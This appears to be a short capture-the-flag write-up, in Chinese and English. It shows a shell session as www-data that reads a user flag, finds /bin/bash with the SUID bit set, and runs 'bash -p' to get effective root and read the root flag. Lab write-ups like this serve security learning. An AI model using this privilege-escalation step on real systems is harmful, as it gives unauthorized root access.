bash-5.1$ iduid=33(www-data) gid=33(www-data) groups=33(www-data)bash-5.1$ pwd  /bash-5.1$ cd homebash-5.1$ lsdevbash-5.1$ cd devbash-5.1$ lsuser.txtbash-5.1$ cat user.txt&lt;user flag&gt;
提权bash-5.1$ ls -al /bin/bash-rwsr-sr-x 1 root root 1396520 Jan  6  2022 /bin/bashbash-5.1# bash -pbash-5.1# iduid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
发现&#x2F;bin&#x2F;bash有root，直接bash -p即可提权
bash-5.1# cd rootbash-5.1# lsroot.txt  snapbash-5.1# cat root.txt&lt;root flag&gt;

